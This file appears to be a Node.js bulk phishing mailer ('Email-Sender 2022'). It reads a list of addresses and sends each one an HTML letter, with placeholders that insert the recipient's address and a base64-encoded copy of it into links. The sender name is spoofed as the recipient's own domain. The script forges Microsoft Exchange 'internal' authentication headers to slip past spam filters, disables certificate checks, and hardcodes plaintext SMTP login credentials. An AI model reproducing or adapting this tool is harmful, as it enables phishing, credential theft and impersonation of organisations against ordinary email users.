'use strict';
const nodemailer = require('nodemailer');
const chalk = require('chalk');
const delay = require('delay');
const _ = require('lodash');
const fs = require('fs');
const randomstring = require('randomstring');
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "1";

async function checkSMTP(data) {
    try {
        let transporter = nodemailer.createTransport({
            pool: true,
            host: data.host,
            port: data.port,
            secure: data.secure,
            auth: {
                user: data.user,
                pass: data.pass
            },
    tls: {
        minVersion: 'TLSv1', // -> This is the line that solved my problem
        rejectUnauthorized: false,
    },
});
        await transporter.verify();
        return Promise.resolve(transporter);
    } catch(err) {
        return Promise.reject(`SMTP ERROR => ${err.message}`);
    }
}

async function readFrom(from, random, email) {
    try {
        from = from.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        from = from.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        from = from.replace(/SILENTCODERSEMAIL/g, email);
        from = from.replace(/SILENTCODERSLIMAHURUF/g, randomstring.generate({length: 5, charset: 'alphabetic'}));
        from = from.replace(/SILENTCODERSBANYAKHURUF/g, randomstring.generate({length: 50, charset: 'alphabetic'}));
        return Promise.resolve(from);
    } catch(err) {
        return Promise.reject(err);
    }
}

async function readLetterAttachments(letter, email) {
    try {
        let sletter = await fs.readFileSync(letter, 'utf-8');
        sletter = sletter.replace(/SILENTCODERSEMAIL/g, email); 
        return Promise.resolve(sletter);
    } catch(err){
        return Promise.reject(err);
    }
}

async function readLetter(letter, email) {
    try {
        let sletter = await fs.readFileSync(letter, 'utf-8');
        sletter = sletter.replace(/SILENTCODERSEMAIL/g, email);
        sletter = sletter.replace(/EMAILURLSILENTC0DERS/g, Buffer.from(email).toString('base64'));
        sletter = sletter.replace(/SILENTCODERSLIMAHURUF/g, randomstring.generate({length: 5, charset: 'alphabetic'}));
        sletter = sletter.replace(/SILENTCODERSBANYAKHURUF/g, randomstring.generate({length: 50, charset: 'alphabetic'}));
        sletter = sletter.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        sletter = sletter.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        return Promise.resolve(sletter);
    } catch(err){
        return Promise.reject(err);
    }
}

(async function() {
    console.log(chalk`
{bold Email-Sender 2022}
{bold.red Code by aaatechie | priderobo.com} 
    `);
    if (process.argv[2] == undefined) {
        console.log('Usage : node file.js listname.txt');
        process.exit(1);
    }
    let smtpConfig = {
        host: 'mail.gmx.net',
        port: '587',
        secure: false, // if port 587, false. if port 465 = true
        user: 'pretarsaial44@gmx.net',
        pass: '3KMEFraAAi'
    };
    const transporter = await checkSMTP(smtpConfig);
    console.log(chalk`{bold [!] SMTP Checked, ready to use !}\n`);
    console.log(chalk`{bold [>] Open list file, ${process.argv[2]}.}`);
    let mailist = await fs.readFileSync(process.argv[2], 'utf-8');
    let emailist = mailist.split(/\r?\n/);
    console.log(chalk`{bold [!] Found ${emailist.length} line.}\n`);
    emailist = _.chunk(emailist, 2);
    for(let i = 0; i < emailist.length; i++) {

        await Promise.all(emailist[i].map(async(email, random) => {
            const doL = await readLetter('index.html', email);
            const doF = await readFrom('DOMAIN <pretarsaial44@gmx.net>', random, email);
            try {
                let mailConfig = {
                    from: doF,
                    html: doL,
				subject:'',
                    to: email,
                    headers: {
                        'X-MS-Exchange-Organization-AuthAs': 'Internal',
                        'X-MS-Exchange-Organization-AuthMechanism': '07',
                        'X-MS-Exchange-Organization-AuthSource': 'AM6PR05MB4232.eurprd05.prod.outlook.com',
                        'X-UMINACJP-NODEMAILERSENDERZ':'true'
                    },
                    };
                    if (process.argv[3] == 'slow'){
                        await require('timers/promises').setTimeout(10000)
                        transporter.sendMail(mailConfig);
                    }else{
                        transporter.sendMail(mailConfig);
                    }

                console.log(chalk`{bold ${email} => SUCCESS}`);
            } catch(err) {
                console.log(chalk`{bold ${email} => ERROR : ${err.message}}`);
            }
        }));


    }
})();